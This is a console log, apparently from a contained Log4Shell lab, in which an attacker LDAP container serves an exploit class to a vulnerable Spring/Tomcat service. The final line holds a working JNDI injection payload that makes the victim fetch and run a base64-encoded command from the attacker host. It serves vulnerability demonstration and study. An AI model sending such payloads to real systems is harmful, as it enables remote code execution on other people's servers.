attacker-ldap_1    | [+] New HTTP Request From /172.21.0.3:60502  /Exploitt9L2pa0wmf.class
victim_1           |    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
victim_1           |    at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
victim_1           |    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189)
victim_1           |    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
victim_1           |    at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100)
victim_1           |    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)
victim_1           |    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189)
victim_1           |    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
victim_1           |    at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)
victim_1           |    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)
victim_1           |    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189)
victim_1           |    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
victim_1           |    at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201)
victim_1           |    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119)
victim_1           |    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:189)
victim_1           |    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:162)
victim_1           |    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:197)
victim_1           |    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97)
victim_1           |    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:540)
victim_1           |    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:135)
victim_1           |    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
victim_1           |    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78)
victim_1           |    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357)
victim_1           |    at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:382)
victim_1           |    at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
victim_1           |    at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:895)
victim_1           |    at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1722)
victim_1           |    at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
victim_1           |    at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191)
victim_1           |    at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
victim_1           |    at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
victim_1           |    at java.lang.Thread.run(Thread.java:748)
victim_1           | Caused by: java.lang.ClassCastException: Exploitt9L2pa0wmf cannot be cast to javax.naming.spi.ObjectFactory
victim_1           |    at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)
victim_1           |    at javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:189)
victim_1           |    at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085)
victim_1           |    ... 88 more
victim_1           |
victim_1           | 2021-12-22 10:02:24.769  INFO 1 --- [nio-8080-exec-3] HelloWorld                               : Received a request for API version ${jndi:ldap://attacker-ldap:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9pd29ya2VkCg==}
Gracefully stopping... (press Ctrl+C again to force)
